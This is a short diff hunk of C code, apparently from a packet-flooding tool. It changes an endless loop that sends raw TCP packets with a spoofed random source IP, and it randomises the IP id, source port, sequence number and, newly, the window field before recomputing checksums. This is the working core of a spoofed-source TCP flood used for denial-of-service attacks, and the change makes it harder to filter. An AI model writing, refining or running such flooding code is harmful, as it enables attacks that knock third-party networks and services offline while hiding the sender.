@@ -394,22 +394,24 @@ int main(int argc, char *argv[]) {
 		exit(1);
 	}
 
-	__be32 old_saddr;
-	__be32 new_saddr;
+	// __be32 old_saddr;
+	// __be32 new_saddr;
 	// Generate packets forever, the caller must terminate this program manually
 	while(1) {
 
 		// Generate a new random source IP, excluding certain prefixes
-		new_saddr = (__be32)(random_ipv4());
+		// new_saddr = (__be32)(random_ipv4());
 
-		tcph->source = rand_next() & 0xffff;
-		iph->id = rand_next() & 0xffff;
-		tcph->seq = rand_next() & 0xffff;
-		iph->saddr = new_saddr;
+		
+		iph->id = rand_next() & 0xffff;		
+		iph->saddr = (__be32)(random_ipv4());
 
 		iph->check = 0;
 		iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
+		tcph->window = rand_next() & 0xffff;
+		tcph->source = rand_next() & 0xffff;
+		tcph->seq = rand_next() & 0xffff;
 		tcph->check = 0;
 		tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + TCP_OPT_LEN), sizeof (struct tcphdr) + TCP_OPT_LEN);
 		
